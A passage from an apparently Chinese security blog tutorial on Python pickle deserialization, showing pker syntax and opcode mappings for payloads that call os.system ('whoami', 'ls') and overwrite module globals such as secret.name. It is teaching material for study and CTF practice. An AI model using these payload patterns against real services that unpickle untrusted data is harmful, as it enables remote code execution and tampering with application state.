+</span></span><span class="line"><span class="cl"><span class="n">INST</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;ls&#39;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">输入</span><span class="err">：</span><span class="n">module</span><span class="p">,</span><span class="n">callable</span><span class="p">,</span><span class="n">para</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">OBJ</span>
+</span></span><span class="line"><span class="cl"><span class="n">对应opcode</span><span class="err">：</span><span class="sa">b</span><span class="s1">&#39;o&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">建立并入栈一个对象</span><span class="err">（</span><span class="n">传入的第一个参数为callable</span><span class="err">，</span><span class="n">可以执行一个函数</span><span class="err">））：</span>
+</span></span><span class="line"><span class="cl"><span class="n">OBJ</span><span class="p">(</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">),</span> <span class="s1">&#39;ls&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">输入</span><span class="err">：</span><span class="n">callable</span><span class="p">,</span><span class="n">para</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">xxx</span><span class="p">(</span><span class="n">xx</span><span class="p">,</span><span class="o">...</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">对应opcode</span><span class="err">：</span><span class="sa">b</span><span class="s1">&#39;R&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">使用参数xx调用函数xxx</span><span class="err">（</span><span class="n">先将函数入栈</span><span class="err">，</span><span class="n">再将参数入栈并调用</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">li</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="mi">321</span>
+</span></span><span class="line"><span class="cl"><span class="n">或</span>
+</span></span><span class="line"><span class="cl"><span class="n">globals_dic</span><span class="p">[</span><span class="s1">&#39;local_var&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;hello&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">对应opcode</span><span class="err">：</span><span class="sa">b</span><span class="s1">&#39;s&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">更新列表或字典的某项的值</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">xx</span><span class="o">.</span><span class="n">attr</span><span class="o">=</span><span class="mi">123</span>
+</span></span><span class="line"><span class="cl"><span class="n">对应opcode</span><span class="err">：</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">对xx对象进行属性设置</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">return</span>
+</span></span><span class="line"><span class="cl"><span class="n">对应opcode</span><span class="err">：</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">出栈</span><span class="err">（</span><span class="n">作为pickle</span><span class="o">.</span><span class="n">loads函数的返回值</span><span class="err">）：</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">xxx</span> <span class="c1"># 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意：</p>
+<ol>
+<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li>
+<li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">test</span><span class="o">=</span><span class="s2">&#34;123&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">test</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>被解析为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">b</span><span class="s2">&#34;S&#39;123&#39;</span><span class="se">\n</span><span class="s2">p0</span><span class="se">\n</span><span class="s2">0g0</span><span class="se">\n</span><span class="s2">.&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pker全局变量覆盖" class="headerLink">
+    <a href="#pker%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96" class="header-mark"></a>pker：全局变量覆盖</h3><ul>
+<li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">secret</span><span class="o">=</span><span class="k">GLOBAL</span><span class="p">(</span><span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;secret&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="c1"># python的执行文件被解析为__main__对象，secret在该对象从属下
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">secret</span><span class="o">.</span><span class="nx">name</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">secret</span><span class="o">.</span><span class="nx">category</span><span class="o">=</span><span class="s1">&#39;2&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>覆盖引入模块的变量：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">game</span> <span class="o">=</span> <span class="k">GLOBAL</span><span class="p">(</span><span class="s1">&#39;guess_game&#39;</span><span class="p">,</span> <span class="s1">&#39;game&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">game</span><span class="o">.</span><span class="nx">curr_ticket</span> <span class="o">=</span> <span class="s1">&#39;123&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来会给出一些具体的基本操作的实例。</p>
+<h4 id="pker函数执行" class="headerLink">
+    <a href="#pker%e5%87%bd%e6%95%b0%e6%89%a7%e8%a1%8c" class="header-mark"></a>pker：函数执行</h4><ul>
+<li>通过<code>b'R'</code>调用：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="s1">&#39;whoami&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="c1"># `b&#39;R&#39;`调用</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>通过<code>b'i'</code>调用：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">INST</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>通过<code>b'c'</code>与<code>b'o'</code>调用：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">OBJ</span><span class="p">(</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">),</span> <span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>多参数调用函数</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">INST</span><span class="p">(</span><span class="s1">&#39;[module]&#39;</span><span class="p">,</span> <span class="s1">&#39;[callable]&#39;</span><span class="p">[,</span> <span class="n">par0</span><span class="p">,</span><span class="n">par1</span><span class="o">...</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">OBJ</span><span class="p">(</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;[module]&#39;</span><span class="p">,</span> <span class="s1">&#39;[callable]&#39;</span><span class="p">)[,</span> <span class="n">par0</span><span class="p">,</span><span class="n">par1</span><span class="o">...</span><span class="p">])</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="pker实例化对象" class="headerLink">
+    <a href="#pker%e5%ae%9e%e4%be%8b%e5%8c%96%e5%af%b9%e8%b1%a1" class="header-mark"></a>pker：实例化对象</h4><ul>
+<li>实例化对象是一种特殊的函数执行</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">animal</span> <span class="o">=</span> <span class="n">INST</span><span class="p">(</span><span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;Animal&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">animal</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 或者</span>
+</span></span><span class="line"><span class="cl"><span class="n">animal</span> <span class="o">=</span> <span class="n">OBJ</span><span class="p">(</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;Animal&#39;</span><span class="p">),</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">animal</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>其中，python原文件中包含：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Animal</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">category</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">category</span> <span class="o">=</span> <span class="n">category</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>也可以先实例化再赋值：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">animal</span> <span class="o">=</span> <span class="n">INST</span><span class="p">(</span><span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;Animal&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">animal</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">animal</span><span class="o">.</span><span class="n">category</span><span class="o">=</span><span class="s1">&#39;2&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">animal</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="手动辅助" class="headerLink">
+    <a href="#%e6%89%8b%e5%8a%a8%e8%be%85%e5%8a%a9" class="header-mark"></a>手动辅助</h4><ul>
+<li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li>
+<li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li>
+</ul>
+<p>参考文章：
+1、 <a href="https://github.com/H3rmesk1t/Security-Learning/blob/main/PythonSec/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener noreferrer">https://github.com/H3rmesk1t/Security-Learning/blob/main/PythonSec/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md</a>
+2、 <a href="https://forum.butian.net/share/1929" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/1929</a>
+3、 <a href="https://tttang.com/archive/1782/#toc__4" target="_blank" rel="noopener noreferrer">https://tttang.com/archive/1782/#toc__4</a>
+4、 <a href="https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0G0%3Dit0Q6qGNnmjYDOn%3DG%3Dzez%3DKd4D#toc-8" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0G0%3Dit0Q6qGNnmjYDOn%3DG%3Dzez%3DKd4D#toc-8</a>
+5、 <a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/89132768</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-04-14</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/python/">PYTHON</a>,&nbsp;<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/%E6%B5%85%E8%B0%88bashfuck/" class="prev" rel="prev" title="浅谈BashFuck"><i class="fas fa-angle-left fa-fw"></i>浅谈BashFuck</a>
+            <a href="/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" class="next" rel="next" title="Open_basedir绕过">Open_basedir绕过<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script></div>
+</body>
+
+</html>
